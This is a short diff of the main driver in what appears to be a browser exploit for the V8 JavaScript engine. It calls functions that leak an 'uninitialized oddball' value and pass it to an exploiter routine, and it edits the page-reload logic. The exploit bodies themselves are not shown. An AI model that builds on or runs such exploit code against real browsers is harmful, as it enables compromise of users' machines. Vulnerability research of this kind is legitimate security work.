@@ -631,19 +631,16 @@ function leak_uninitialized_oddball() {
 function main() {
     var glob_uninitialized_oddball = leak_uninitialized_oddball();
     // %DebugPrint(glob_uninitialized_oddball);
-    
+    alert(typeof(glob_uninitialized_oddball));
     if(typeof(glob_uninitialized_oddball) != "undefined"){
         // alert(typeof(glob_uninitialized_oddball));
-        location.hred = "test8.html"
+        location.hred = "test9.html"
         window.location.reload();
         // console.log("1");
         // window.location.reload();
     }
-    else{
-        alert(typeof(glob_uninitialized_oddball));
-        UninitializedOddballExploiter(glob_uninitialized_oddball);
-    }
     
+    UninitializedOddballExploiter(glob_uninitialized_oddball);
 }
 
 main();
